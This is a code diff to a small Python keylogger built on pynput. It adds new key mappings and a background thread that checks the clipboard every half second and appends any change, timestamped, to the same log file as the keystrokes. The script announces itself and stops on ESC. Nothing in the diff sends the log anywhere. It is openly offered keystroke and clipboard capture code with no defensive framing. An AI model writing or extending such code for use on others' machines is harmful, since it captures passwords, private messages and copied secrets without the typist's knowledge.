@@ -1,5 +1,8 @@
 from pynput import keyboard
 import datetime
+import pyperclip
+import time
+import threading
 
 logFile = "log.txt"
 
@@ -15,6 +18,8 @@ mappedKeys = {
     'Key.left': '[LEFT]',
     'Key.right': '[RIGHT]',
     'Key.caps_lock': '[CAPSLOCK]',
+    'Key.esc': '[ESCAPE]',
+    'Key.cmd': '[CMD]',
 }
 
 def press(key):
@@ -38,9 +43,27 @@ def release(key):
         print("Logging stopped")
         return False
 
+def clipboard_monitoring():
+    clipboard = "" # Tracks whatever is on the clipboard
+    while True:
+        try:
+            current_clipboard = pyperclip.paste()
+            # If there are any changes in the contents of the clipboard, log it
+            if current_clipboard != clipboard:
+                clipboard = current_clipboard
+                timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                with open(logFile, "a") as file:
+                    file.write(f"[{timestamp}] [Clipboard] {clipboard}\n")
+        except Exception:
+            pass
+        time.sleep(0.5) # Check every half second
+
+
 
 if __name__ == "__main__":
     print("Keylogger started, press ESC to exit")
+
+    threading.Thread(target=clipboard_monitoring, daemon=True).start()
 
     with keyboard.Listener(on_press=press, on_release=release) as listener:
         # listener remains running until release() returns False
